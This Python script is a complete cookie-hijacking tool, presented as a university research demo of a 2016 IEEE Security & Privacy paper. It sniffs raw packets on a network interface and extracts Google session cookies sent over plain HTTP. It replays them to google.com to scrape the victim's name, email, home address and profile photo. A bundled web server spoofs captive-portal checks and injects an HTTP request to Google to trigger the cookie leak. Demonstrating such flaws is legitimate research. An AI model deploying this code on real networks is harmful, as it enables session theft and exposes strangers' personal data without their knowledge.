###########################################################################################################
									# Import Necessary Libraries #
###########################################################################################################
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
from SocketServer import ThreadingMixIn
from bs4 import BeautifulSoup
import sys, socket, struct, os, array, copy, dpkt, requests, threading, time

# necessary for accessing libdnet from within a virtualenv on OSX
if sys.platform == "darwin":
  import site; site.addsitedir("/usr/local/lib/python2.7/site-packages")

from scapy.all import ETH_P_ALL
from scapy.all import select
from scapy.all import MTU


###########################################################################################################
									# Declare Global Variables #
###########################################################################################################

session_ids =set()  # global set for all session ids
user_packet ={} 	# # dict that contains the whole user packet
user_complete = {}	# dict to track packet status if chunked
user_start = {}		# dict to track user packet start
cookie_dict = {} 	# dict to store the user cookies
img_dict =  {} 		# dict to store the pared image URL
captive_list = ["clients3.google.com", "akamaitechnologies.com", "apple.com", "appleiphonecell.com", "itools.info", "ibook.info", "airport.us", "thinkdifferent.us", "akamaiedge.net", "msftncsi.com", "microsoft.com"]



###########################################################################################################
                    # Function to Extract Session Token From Google Cookie String #
###########################################################################################################

def extract_google_stok(cookie):
	session_tok = None;
	cookie_toks = cookie.split(": ")[1].split("; ")
	for i in cookie_toks:
		if i[0:4].lower() == "sid=":
			session_tok = i.split("SID=")[1]
			break
	if session_tok == None:
		return None
	else:
		return session_tok


###########################################################################################################
                    # Function to Extract Session Token From Google Cookie String #
###########################################################################################################

def extract_cookie(src_ip, src_port, payload):

	# provide access to globar variables
	global cookie_dict
	global session_ids
	global user_packet
	global user_complete
	global user_start
	global counter
	s_tok = None
	cur_packet = None
	user_key = src_ip+":"+src_port

	#create an entry for a user tuple
	if 'get /' in payload.lower()  and "google.com" in payload.lower() and user_key not in user_packet:
		user_packet[user_key] =	 None
		user_complete[user_key] = 0

	#update packet collection for each individual stream
	if user_key in user_packet and '\r\n\r\n' in payload and user_key not in user_start:

		cur_packet = copy.deepcopy(payload)
		user_packet[user_key] = cur_packet
		user_complete[user_key] = 1

	elif user_key in user_packet and '\r\n\r\n' not in payload and user_key not in user_start:
		cur_packet = copy.deepcopy(payload)
		user_packet[user_key] =  cur_packet
		user_start[user_key] = 1

	elif user_key in user_packet and user_key in user_start and  user_complete[user_key] == 0:
		cur_packet = copy.deepcopy(payload)
		user_packet[user_key] =  user_packet[user_key] + cur_packet

		# if this was the last chunk of the packet
		if '\r\n\r\n' in cur_packet:
			packet_start = 0
			del user_start[user_key]
			user_complete[user_key] = 1

	# extract the user cookie and store it
	if user_key in user_complete:

		if user_complete[user_key] ==1 and "cookie" in user_packet[user_key].lower():
			
		 	header_arr = user_packet[user_key].split("\r\n")

		 	for field  in header_arr:
				if "cookie: "in field.lower(): #if cookie is found in the header
		 			cookie_str = field
					s_tok = extract_google_stok(field)
					#print "cookie found"
					break

			if s_tok not in session_ids and s_tok != None:
	  			session_ids.update([s_tok])
	 			temp_cookie = cookie_str.split(": ")[1]
	 			#print temp_cookie
	 			
	 			cookie_dict[src_ip] = temp_cookie

			if user_complete[user_key] == 1:
				del user_complete[user_key]
				del	user_packet[user_key]


###########################################################################################################
                # Function to Replay the Cookie Request, Perfomed by the Response Server #
###########################################################################################################

def make_request (user_ip, cookie):

	global img_dict

	url = 'http://www.google.com/search?q=home&oq=home&gws_rd=ssl'
	add_headers = {"Connection": "keep-alive", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.86 Safari/537.36", "Accept-Language": "en-US,en;q=0.8"}
	add_headers["Cookie"] = cookie
	r = requests.get(url, headers=add_headers)
	resp = r.content
	soup = BeautifulSoup(resp, 'html.parser')
	
	#update the user image link
	img_link = resp.split("::before{content:url(//")[1].split(");")[0].replace("/s32","/s150")
	img_dict[user_ip] = img_link

	name_div = soup.findAll("div", { "class" : "gb_Cb"})
	if len(name_div) > 0:
		name = name_div[0].text
	else:
		name = " "

	email_div = soup.findAll("div", { "class" : "gb_Db"})
	if len(email_div) > 0:
		email = email_div[0].text.split(" ")[0]
	else:
		email = " "

	home_div = soup.findAll("div", { "class" : "vk_sh vk_bk"})
	if len(home_div) > 0:
		home = home_div[0].text.split("-")[1][1:]
	else:
		home = " "

	return name, email, home


###########################################################################################################
                           # Function to Grab User Image Data Content #
###########################################################################################################

def grab_img (img_link, cookie):

	add_headers = {"Connection": "keep-alive", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.86 Safari/537.36", "Accept-Language": "en-US,en;q=0.8"}
	add_headers["Cookie"] = cookie
	r = requests.get("http://"+img_link, headers=add_headers)

	return r.content


###########################################################################################################
                           # Function to Grab User Image Data Content #
###########################################################################################################

def run_response_server():

	global cookie_dict
	global img_dict
	global captive_list

	class Handler(BaseHTTPRequestHandler):

		#Handler for the GET requests
		def do_GET(self):

			cur_domain = None
			captive_page = 0
			head_array = str(self.headers)
			cookie_flag = 0
			head_array = head_array.split("\r\n")

			for hdr in head_array:
				if "host: " in hdr.lower():
					cur_domain = copy.deepcopy(hdr.split(": ")[1])
					break
				
			for cap_host in captive_list:
				if cap_host in cur_domain:
					captive_page =1
					break

			if "/hotspot-detect.html" in str(self.path):
				captive_page =1

			if captive_page == 1:

				self.send_response(200)
				self.send_header('Content-type','text/html')
				self.end_headers()
				self.wfile.write("<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>")
				return
			
			else:

				self.path = self.path.split("?")[0]

				if self.path == "/usr_cookie_attack_page.html":
					
					now = time.time()
					timeout = now + 15

				 	while cookie_flag == 0:

						if self.client_address[0] in cookie_dict:

							if self.path == "/usr_cookie_attack_page.html": #send html response

								name, email, home = make_request(self.client_address[0], cookie_dict[self.client_address[0]])
								self.send_response(200)
								self.send_header('Content-type','text/html')
								self.end_headers()

								#make changes here to make the HTML look more facny
								self.wfile.write("<p>&nbsp;</p><h1 style=\"text-align:center\"><span style=\"font-family:arial,helvetica,sans-serif\"><big><span style=\"font-size:60px\">"\
									"<strong><span style=\"color:#0066ff\">G</span><span style=\"color:#FF0000\">o</span><span style=\"color:#FFD700\">o</span><span style=\"color:#0066ff\">g"\
									"</span><span style=\"color:#00cc33\">l</span><span style=\"color:#FF0000\">e</span></strong></span> <span style=\"font-size:55px\"><strong>Cookie Hijacking Demo"\
									"</strong></span></big></span></h1><hr align=\"center\" style=\"width:820px\"/><table align=\"center\" border=\"0\" cellpadding=\"1\" cellspacing=\"15\" style=\"width:800px\">"\
									"<tbody><tr><td><span style=\"font-size:28px\"><span style=\"color:#0066ff\"><u><strong><span style=\"font-family:arial,helvetica,sans-serif\">The Talk</span></strong></u>"\
									"</span></span></td></tr><tr><td style=\"text-align:justify\"><p><span style=\"font-size:20px\"><span style=\"font-family:arial,helvetica,sans-serif\">This cookie hijacking demo "\
									"is a demonstration of the research by Suphannee Sivakorn, Iasonas Polakis, and Angelos D. Keromytis from Columbia University. The original talk, titled &ldquo;<strong><em>The Cracked"\
									"Cookie Jar: HTTP Cookie Hijacking and the Exposure of Private Information</em></strong>&rdquo; will be presented during session 9 (Don&#39;t go on the Web) on May 25, 2016 at the 37th "\
									"IEEE Security &amp; Privacy Conference</span></span>.</p></td></tr></tbody></table><table align=\"center\" border=\"0\" cellpadding=\"1\" cellspacing=\"15\" style=\"width:800px\"><tbody>"\
									"<tr><td style=\"text-align: center;\"><span style=\"color:#0066ff\"><u><strong><span style=\"font-size:28px\"><span style=\"font-family:arial,helvetica,sans-serif\">Personal Information</span>"\
									"</span></strong></u></span></td></tr><tr><td style=\"text-align:justify\"><table align=\"center\" border=\"0\" cellpadding=\"1\" cellspacing=\"1\" style=\"width:500px\"><tbody><tr><td>"\
									"<img src=\"usr_cookie_attack_photo.jpg\" alt=\"profile_picture\" style=\"height:150px; width:150px\" /></td><td "\
									"style=\"text-align:left\"><span style=\"font-size:20px\">&nbsp; &nbsp;&nbsp;</span></td><td><table align=\"left\" border=\"0\" cellpadding=\"1\" cellspacing=\"1\" style=\"line-height:1.6; width:300px\">"\
									"<tbody><tr><td style=\"text-align:center\"><p><span style=\"font-size:18px\"><span style=\"font-family:arial,helvetica,sans-serif\"><strong>"+name+"</strong></span></span></p></td></tr><tr>"\
									"<td style=\"text-align:center\"><span style=\"font-size:18px\"><span style=\"font-family:arial,helvetica,sans-serif\">"+email+"</span></span></td></tr><tr><td style=\"text-align:left\">"\
									"<p style=\"text-align:center\"><span style=\"font-size:18px\"><span style=\"font-family:arial,helvetica,sans-serif\">"+home+"</span></span></p></td></tr></tbody></table><p>"\
									"&nbsp;</p></td></tr></tbody></table></td></tr></tbody></table><table align=\"center\" border=\"0\" cellpadding=\"1\" cellspacing=\"15\" style=\"width:800px\"><tbody><tr><td><span style=\"font-size:28px\">"\
									"<span style=\"color:#0066ff\"><u><strong><span style=\"font-family:arial,helvetica,sans-serif\">How it Works</span></strong></u></span></span></td></tr><tr><td style=\"text-align:justify\"><p><span style=\"font-"\
									"size:20px\"><span style=\"font-family:arial,helvetica,sans-serif\">Google does not currently enforce ubiquitous encryption of incoming requests. By allowing HTTP connections to proceed, a malicious entity can cause "\
									"a victim&rsquo;s browser to make requests in the clear, including Google session cookies. These cookies can then be used to make requests to Google which divulge sensitive information about the account in use. "\
									"This POC&nbsp;works by including a resource from google.com using HTTP, which allows us to recover the user&rsquo;s Google session cookie. We then make requests to Google to elicit the sensitive information. "\
									"We perform this attack after you click a button, but a malicious access point could easily inject references to google.com resources into any HTTP&nbsp;based response.</span></span></p></td></tr></tbody></table>"\
									"<table align=\"center\" border=\"0\" cellpadding=\"1\" cellspacing=\"15\" style=\"width:800px\"><tbody><tr><td style=\"text-align:center\"><p><span style=\"font-size:17px\"><span style=\"font-family:arial,helvetica,"\
									"sans-serif\">*This demo was prepared by Mohammad Taha Khan, Chris Kanich and Steve Checkoway from the University of Illinois at Chicago</span></span>.</p></td></tr></tbody></table><hr align=\"center\" style=\"width:820px\"/><p>&nbsp;</p>")

							cookie_flag = 1
							return

						if time.time() > timeout:
							self.send_error(408,'Please try again while signed in with your google account')
							return

				elif self.path == "/usr_cookie_attack_photo.jpg":
					image_content = grab_img (img_dict[self.client_address[0]], cookie_dict[self.client_address[0]])
					self.send_response(200)
					self.send_header('Content-type','image/jpg')
					self.end_headers()
					self.wfile.write(image_content)
					return

				else:
					self.send_response(200)
					self.send_header('Content-type','text/html')
					self.end_headers()
					self.wfile.write("<p>&nbsp;</p><img id=\"demoImg\" src=\"https://example.com/whatever.png\" style=\"width:1px;height:1px\"><h1 style=\"text-align:center\"><span style=\"font-family:arial,"\
						"helvetica,sans-serif\"><big><span style=\"font-size:60px\"><strong><span style=\"color:#0066ff\">G</span><span style=\"color:#FF0000\">o</span><span style=\"color:#FFD700\">o</span><span style=\"color:#0066ff\">g</span>"\
						"<span style=\"color:#00cc33\">l</span><span style=\"color:#FF0000\">e</span> </strong></span><span style=\"font-size:55px\"><strong>Cookie Hijacking Demo</strong></span></big></span></h1><hr align=\"center\" style=\"width:820px\">"\
						"<table align=\"center\" border=\"0\" cellpadding=\"1\" cellspacing=\"15\" style=\"width:800px\"><tbody><tr><td><span style=\"font-size:28px\"><span style=\"color:#0066ff\"><u><strong><span style=\"font-family:arial,helvetica,sans-serif\">"\
						"The Talk</span></strong></u></span></span></td></tr><tr><td style=\"text-align:justify\"><p><span style=\"font-size:20px\"><span style=\"font-family:arial,helvetica,sans-serif\">This cookie hijacking demo is a demonstration of the"\
						"research by Suphannee Sivakorn, Iasonas Polakis, and Angelos D. Keromytis from Columbia University. The original talk, titled &ldquo;<strong><em>The Cracked Cookie Jar: HTTP Cookie Hijacking and the Exposure of Private Information</em>"\
						"</strong>&rdquo; will be presented during session 9 (Don&#39;t go on the Web) on May 25, 2016 at the 37th IEEE Security &amp; Privacy Conference</span></span>.</p></td></tr></tbody></table><table align=\"center\" border=\"0\" cellpadding=\"1\""\
						"cellspacing=\"15\" style=\"width:800px\"><tbody><tr><td><span style=\"color:#0066ff\"><u><strong><span style=\"font-size:28px\"><span style=\"font-family:arial,helvetica,sans-serif\">About This Demo</span></span></strong></u></span></td></tr><tr>"\
						"<td style=\"text-align:justify\"><p><span style=\"font-size:20px\"><span style=\"font-family:arial,helvetica,sans-serif\">This web page provides a demonstration of the attack described in the paper. If you click accept below, we will show you "\
						"what information can be extracted from the cookies your browser sends in the clear to Google. This attack only provides limited visibility, and does not allow us to control your Google account in any way. All data is shown only to you, and we do "\
						"not save any of this information.</span></span></p></td></tr></tbody></table><br><div align=\"center\"><style>.myButton {background-color:#cf2323;-moz-border-radius:8px;-webkit-border-radius:8px;border-radius:8px;border:1px solid #ffffff;display:in"\
						"line-block;cursor:pointer;color:#ffffff;font-family:Arial;font-size:20px;padding:14px 37px;text-decoration:none;}</style><button id=\"demoBtn\" class=\"mybutton\">View Personal Information</button><script>document.getElementById(\"demoBtn\").onclick="\
						"function(){document.getElementById(\"demoImg\").src = \"http://www.google.com/thisimagedoesnotexist.png\";window.setTimeout(window.location.href = \"http://172.16.42.1:8000/usr_cookie_attack_page.html\",10000);}</script></div><br><table align=\"center\" border=\"0\" cellpadding=\"1\""\
						"cellspacing=\"15\" style=\"width:800px\"><tbody><tr><td style=\"text-align:center\"><p><span style=\"font-size:17px\" ><span style=\"font-family:arial,helvetica,sans-serif\" >*This demo was prepared by Mohammad Taha Khan, Chris Kanich and Steve Checkoway from the University "\
						"of Illinois at Chicago</span></span>.</p></td></tr></tbody></table><hr align=\"center\" style=\"width:820px\"><p>&nbsp;</p>")
					return

	class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
	    """Handle requests in a separate thread."""

	server = ThreadedHTTPServer(('', 8000), Handler)
	print 'Starting server, use <Ctrl-C> to stop'
	server.serve_forever()


###########################################################################################################
                           # Function to Parse The User Packet  #
###########################################################################################################

def packet_parser(packet):

	try:
		if len(packet) <= 0:
			return None
		
		eth_header = struct.unpack("!6s6sH", packet[0:14])

		if eth_header[2] != 0x800:
			return None

		# extract source address and source port at the array from the array

		ip_header = packet[14:34]
		iph = struct.unpack('!BBHHHBBH4s4s' , ip_header)
		ihl = iph[0] & 0xF
		iph_length = ihl * 4
		s_addr = socket.inet_ntoa(iph[8]);

		# extract source address from the array

		tcp_header = packet[14+iph_length:14+iph_length+20]
		tcph = struct.unpack('!HHLLBBHHH' , tcp_header)
		
		source_port = tcph[0]
		tcph_length = tcph[4] >> 4

		h_size = 14 + iph_length + tcph_length * 4
		data_size = len(packet) - h_size
		data = packet[h_size:]

		return [str(s_addr), str(source_port), data]
	except:
		return None


###########################################################################################################
                   					  # Program Main Function #
###########################################################################################################

def main():
	
	#run_response_server()
	#Run the response server in a parallel thread
	server_thread = threading.Thread(target=run_response_server, args=())
	server_thread.daemon = True   
	server_thread.start()

	#Create a raw socket for listening to all packets
	interface = sys.argv[1]
	cookie_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
	cookie_socket.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
	cookie_socket.bind((interface, ETH_P_ALL))

	# Continously listen for packets and parse them
	print "now listening on: "+interface
	while True:

		pkt, sa_ll = cookie_socket.recvfrom(MTU)
		packet_elements = packet_parser(pkt)

		if packet_elements != None:
			extract_cookie(packet_elements[0], packet_elements[1], packet_elements[2])

if __name__ == '__main__':
	main()
	
